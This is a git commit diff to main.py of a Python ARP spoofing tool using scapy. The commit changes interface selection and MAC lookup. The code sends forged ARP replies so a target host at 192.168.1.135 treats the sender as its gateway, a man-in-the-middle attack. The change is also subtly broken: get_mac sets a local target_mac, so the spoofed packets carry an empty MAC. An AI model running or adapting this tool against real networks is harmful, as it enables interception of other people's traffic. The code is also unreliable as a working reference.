bb974a5ac164368e44a362c88659e2f4cb4a678c
shoham-z <shozeh123@gmail.com>
2022-11-22 12:25:16 +0200

    choosing interface working now

--- main.py
+++ main.py
@@ -5,6 +5,7 @@ import time
 # to run in linux:
 # sudo python3 main.py [args]
 
+target_mac = ""
 target_ip = "192.168.1.135"  # Enter your target IP
 spoof_ip = "192.168.1.1"  # Enter your gateway's IP
 attack_gw = False
@@ -23,15 +24,18 @@ def get_mac(ip):
             answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
     except:
         print("interface is unavailable")
-    return answered_list[0][1].hwsrc
+    try:
+        target_mac = answered_list[0][1].hwsrc
+    except:
+        print("no machine found with the given ip")
 
 
 def spoof(target_ip, spoof_ip):
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip),
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                        psrc=spoof_ip)
     try:
         if interface is not None:
-            scapy.send(packet, verbose=False, interface=interface)
+            scapy.send(packet, verbose=False, iface=interface)
         else:
             scapy.send(packet, verbose=False)
     except:
@@ -58,7 +62,7 @@ def main():
 if __name__ == "__main__":
     if len(sys.argv) > 1:
         if sys.argv[1] == "-h" or sys.argv[1] == "--help":
-            print("usage:\n     ArpSpoofer.py [-h] [-i IFACE] [-s SRC] [-d DELAY] [-gw] -t TARGET")
+            print("usage:\n     python ArpSpoofer.py [-h] [-i IFACE] [-s SRC] [-d DELAY] [-gw] -t TARGET")
             print("\nSpoof ARP tables\noptional arguments:")
             print("-h, --help                      show this help message and exit")
             print(" -i IFACE, --iface IFACE        Interface you wish to use")
